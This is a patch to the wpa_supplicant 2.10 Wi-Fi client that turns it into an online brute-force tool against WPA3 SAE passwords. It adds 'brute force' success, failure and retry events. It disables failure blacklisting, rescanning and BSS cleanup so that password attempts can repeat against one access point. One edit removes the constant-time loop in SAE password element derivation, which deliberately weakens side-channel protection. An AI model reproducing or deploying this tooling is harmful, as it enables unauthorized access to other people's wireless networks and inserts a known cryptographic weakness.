@@ -1,0 +1,200 @@
+diff --git a/wpa_supplicant-2.10/src/common/sae.c b/wpa_supplicant-2.10/src/common/sae.c
+index c0f154e..5b0fe82 100644
+--- a/wpa_supplicant-2.10/src/common/sae.c
++++ b/wpa_supplicant-2.10/src/common/sae.c
+@@ -282,7 +282,8 @@ static int sae_derive_pwe_ecc(struct sae_data *sae, const u8 *addr1,
+ 			      const u8 *addr2, const u8 *password,
+ 			      size_t password_len)
+ {
+-	u8 counter, k;
++	//u8 counter, k;
++	u8 counter, k = 1; // remove constant time loop
+ 	u8 addrs[2 * ETH_ALEN];
+ 	const u8 *addr[2];
+ 	size_t len[2];
+diff --git a/wpa_supplicant-2.10/src/common/wpa_ctrl.h b/wpa_supplicant-2.10/src/common/wpa_ctrl.h
+index 2c7ec04..5b50ad7 100644
+--- a/wpa_supplicant-2.10/src/common/wpa_ctrl.h
++++ b/wpa_supplicant-2.10/src/common/wpa_ctrl.h
+@@ -101,6 +101,12 @@ extern "C" {
+ #define WPA_EVENT_DO_ROAM "CTRL-EVENT-DO-ROAM "
+ /** Decision made to skip a within-ESS roam */
+ #define WPA_EVENT_SKIP_ROAM "CTRL-EVENT-SKIP-ROAM "
++/** auth success for our brute force stuff (WPA3) */
++#define WPA_EVENT_BRUTE_SUCCESS "CTRL-EVENT-BRUTE-SUCCESS "
++/** auth failure for our brute force stuff (WPA3) */
++#define WPA_EVENT_BRUTE_FAILURE "CTRL-EVENT-BRUTE-FAILURE "
++/** retry for our brute force stuff (WPA3) */
++#define WPA_EVENT_BRUTE_RETRY "CTRL-EVENT-BRUTE-RETRY "
+ 
+ /** IP subnet status change notification
+  *
+diff --git a/wpa_supplicant-2.10/wpa_supplicant/Makefile b/wpa_supplicant-2.10/wpa_supplicant/Makefile
+index cb66def..d8ed862 100644
+--- a/wpa_supplicant-2.10/wpa_supplicant/Makefile
++++ b/wpa_supplicant-2.10/wpa_supplicant/Makefile
+@@ -263,6 +263,8 @@ OBJS += ../src/common/sae_pk.o
+ endif
+ NEED_ECC=y
+ NEED_DH_GROUPS=y
++# Needed for compilation of SAE on some platforms
++NEED_AES_OMAC1=y
+ NEED_HMAC_SHA256_KDF=y
+ NEED_DRAGONFLY=y
+ ifdef CONFIG_TESTING_OPTIONS
+diff --git a/wpa_supplicant-2.10/wpa_supplicant/events.c b/wpa_supplicant-2.10/wpa_supplicant/events.c
+index f55e184..b83aa6e 100644
+--- a/wpa_supplicant-2.10/wpa_supplicant/events.c
++++ b/wpa_supplicant-2.10/wpa_supplicant/events.c
+@@ -2149,11 +2149,11 @@ static int _wpa_supplicant_event_scan_results(struct wpa_supplicant *wpa_s,
+ 	if (wpa_s->last_scan_req == MANUAL_SCAN_REQ &&
+ 	    wpa_s->manual_scan_use_id && wpa_s->own_scan_running &&
+ 	    own_request && !(data && data->scan_info.external_scan)) {
+-		wpa_msg_ctrl(wpa_s, MSG_INFO, WPA_EVENT_SCAN_RESULTS "id=%u",
+-			     wpa_s->manual_scan_id);
++		//wpa_msg_ctrl(wpa_s, MSG_INFO, WPA_EVENT_SCAN_RESULTS "id=%u",
++		//wpa_s->manual_scan_id);
+ 		wpa_s->manual_scan_use_id = 0;
+ 	} else {
+-		wpa_msg_ctrl(wpa_s, MSG_INFO, WPA_EVENT_SCAN_RESULTS);
++		//wpa_msg_ctrl(wpa_s, MSG_INFO, WPA_EVENT_SCAN_RESULTS);
+ 	}
+ 	wpas_notify_scan_results(wpa_s);
+ 
+@@ -2442,19 +2442,22 @@ int wpa_supplicant_fast_associate(struct wpa_supplicant *wpa_s)
+ #ifdef CONFIG_NO_SCAN_PROCESSING
+ 	return -1;
+ #else /* CONFIG_NO_SCAN_PROCESSING */
+-	struct os_reltime now;
++	//struct os_reltime now;
+ 
+ 	wpa_s->ignore_post_flush_scan_res = 0;
+ 
+ 	if (wpa_s->last_scan_res_used == 0)
+ 		return -1;
+ 
++	// Always use the saved bss network config
++	/*
+ 	os_get_reltime(&now);
+ 	if (os_reltime_expired(&now, &wpa_s->last_scan,
+ 			       wpa_s->conf->scan_res_valid_for_connect)) {
+ 		wpa_printf(MSG_DEBUG, "Fast associate: Old scan results");
+ 		return -1;
+ 	}
++	*/
+ 
+ 	return wpas_select_network_from_last_scan(wpa_s, 0, 1);
+ #endif /* CONFIG_NO_SCAN_PROCESSING */
+@@ -3640,6 +3643,7 @@ static void wpa_supplicant_event_disassoc_finish(struct wpa_supplicant *wpa_s,
+ 		if (wpas_p2p_4way_hs_failed(wpa_s) > 0)
+ 			return; /* P2P group removed */
+ 		wpas_auth_failed(wpa_s, "WRONG_KEY");
++		wpa_msg_ctrl(wpa_s, MSG_INFO, WPA_EVENT_BRUTE_FAILURE);
+ #ifdef CONFIG_DPP2
+ 		wpas_dpp_send_conn_status_result(wpa_s,
+ 						 DPP_STATUS_AUTH_FAILURE);
+diff --git a/wpa_supplicant-2.10/wpa_supplicant/notify.c b/wpa_supplicant-2.10/wpa_supplicant/notify.c
+index 821c916..63bebb0 100644
+--- a/wpa_supplicant-2.10/wpa_supplicant/notify.c
++++ b/wpa_supplicant-2.10/wpa_supplicant/notify.c
+@@ -409,8 +409,8 @@ void wpas_notify_bss_added(struct wpa_supplicant *wpa_s,
+ 		return;
+ 
+ 	wpas_dbus_register_bss(wpa_s, bssid, id);
+-	wpa_msg_ctrl(wpa_s, MSG_INFO, WPA_EVENT_BSS_ADDED "%u " MACSTR,
+-		     id, MAC2STR(bssid));
++	//wpa_msg_ctrl(wpa_s, MSG_INFO, WPA_EVENT_BSS_ADDED "%u " MACSTR,
++	//	     id, MAC2STR(bssid));
+ }
+ 
+ 
+@@ -421,8 +421,8 @@ void wpas_notify_bss_removed(struct wpa_supplicant *wpa_s,
+ 		return;
+ 
+ 	wpas_dbus_unregister_bss(wpa_s, bssid, id);
+-	wpa_msg_ctrl(wpa_s, MSG_INFO, WPA_EVENT_BSS_REMOVED "%u " MACSTR,
+-		     id, MAC2STR(bssid));
++	//wpa_msg_ctrl(wpa_s, MSG_INFO, WPA_EVENT_BSS_REMOVED "%u " MACSTR,
++	//	     id, MAC2STR(bssid));
+ }
+ 
+ 
+diff --git a/wpa_supplicant-2.10/wpa_supplicant/sme.c b/wpa_supplicant-2.10/wpa_supplicant/sme.c
+index 7f43216..b824c25 100644
+--- a/wpa_supplicant-2.10/wpa_supplicant/sme.c
++++ b/wpa_supplicant-2.10/wpa_supplicant/sme.c
+@@ -1362,6 +1362,8 @@ static int sme_sae_auth(struct wpa_supplicant *wpa_s, u16 auth_transaction,
+ 			" auth_type=%u auth_transaction=%u status_code=%u",
+ 			MAC2STR(bssid), WLAN_AUTH_SAE,
+ 			auth_transaction, status_code);
++		wpa_msg_ctrl(wpa_s, MSG_INFO, WPA_EVENT_BRUTE_FAILURE);
++		wpa_dbg(wpa_s, MSG_DEBUG, "WPA_EVENT_BRUTE_FAILURE hit");
+ 		return -1;
+ 	}
+ 
+@@ -1459,6 +1461,7 @@ static int sme_sae_set_pmk(struct wpa_supplicant *wpa_s, const u8 *bssid)
+ {
+ 	wpa_printf(MSG_DEBUG,
+ 		   "SME: SAE completed - setting PMK for 4-way handshake");
++	wpa_msg_ctrl(wpa_s, MSG_INFO, WPA_EVENT_BRUTE_SUCCESS);
+ 	wpa_sm_set_pmk(wpa_s->wpa, wpa_s->sme.sae.pmk, PMK_LEN,
+ 		       wpa_s->sme.sae.pmkid, bssid);
+ 	if (wpa_s->conf->sae_pmkid_in_assoc) {
+@@ -1540,6 +1543,7 @@ void sme_event_auth(struct wpa_supplicant *wpa_s, union wpa_event_data *data)
+ 	if (wpa_s->wpa_state != WPA_AUTHENTICATING) {
+ 		wpa_dbg(wpa_s, MSG_DEBUG, "SME: Ignore authentication event "
+ 			"when not in authenticating state");
++		wpa_msg_ctrl(wpa_s, MSG_INFO, WPA_EVENT_BRUTE_RETRY);
+ 		return;
+ 	}
+ 
+@@ -2232,6 +2236,8 @@ void sme_event_auth_timed_out(struct wpa_supplicant *wpa_s,
+ 	wpa_dbg(wpa_s, MSG_DEBUG, "SME: Authentication timed out");
+ 	wpas_connection_failed(wpa_s, wpa_s->pending_bssid);
+ 	wpa_supplicant_mark_disassoc(wpa_s);
++	wpa_dbg(wpa_s, MSG_DEBUG, "WPA_EVENT_BRUTE_RETRY");
++	wpa_msg_ctrl(wpa_s, MSG_INFO, WPA_EVENT_BRUTE_RETRY);
+ }
+ 
+ 
+@@ -2269,6 +2275,8 @@ static void sme_auth_timer(void *eloop_ctx, void *timeout_ctx)
+ 	if (wpa_s->wpa_state == WPA_AUTHENTICATING) {
+ 		wpa_msg(wpa_s, MSG_DEBUG, "SME: Authentication timeout");
+ 		sme_deauth(wpa_s);
++		wpa_dbg(wpa_s, MSG_DEBUG, "WPA_EVENT_BRUTE_RETRY");
++		wpa_msg_ctrl(wpa_s, MSG_INFO, WPA_EVENT_BRUTE_RETRY);
+ 	}
+ }
+ 
+diff --git a/wpa_supplicant-2.10/wpa_supplicant/wpa_supplicant.c b/wpa_supplicant-2.10/wpa_supplicant/wpa_supplicant.c
+index d37a994..8411ee8 100644
+--- a/wpa_supplicant-2.10/wpa_supplicant/wpa_supplicant.c
++++ b/wpa_supplicant-2.10/wpa_supplicant/wpa_supplicant.c
+@@ -1001,6 +1001,7 @@ void wpa_supplicant_set_state(struct wpa_supplicant *wpa_s,
+ 			ssid ? ssid->id : -1,
+ 			ssid && ssid->id_str ? ssid->id_str : "",
+ 			fils_hlp_sent ? " FILS_HLP_SENT" : "");
++		wpa_msg(wpa_s, MSG_INFO, WPA_EVENT_BRUTE_SUCCESS);
+ #endif /* CONFIG_CTRL_IFACE || !CONFIG_NO_STDOUT_DEBUG */
+ 		wpas_clear_temp_disabled(wpa_s, ssid, 1);
+ 		wpa_s->consecutive_conn_failures = 0;
+@@ -7280,6 +7281,9 @@ static void wpas_periodic(void *eloop_ctx, void *timeout_ctx)
+ 	eloop_register_timeout(WPA_SUPPLICANT_CLEANUP_INTERVAL, 0,
+ 			       wpas_periodic, global, NULL);
+ 
++	// Don't clear our bss entry for the WPA3 attack
++	return;
++
+ #ifdef CONFIG_P2P
+ 	if (global->p2p)
+ 		p2p_expire_peers(global->p2p);
+@@ -7681,6 +7685,9 @@ void wpas_connection_failed(struct wpa_supplicant *wpa_s, const u8 *bssid)
+ 		return;
+ 	}
+ 
++	wpa_dbg(wpa_s, MSG_DEBUG, "Preventing blacklist addition and rescan");
++	return;
++
+ 	/*
+ 	 * Add the failed BSSID into the ignore list and speed up next scan
+ 	 * attempt if there could be other APs that could accept association.
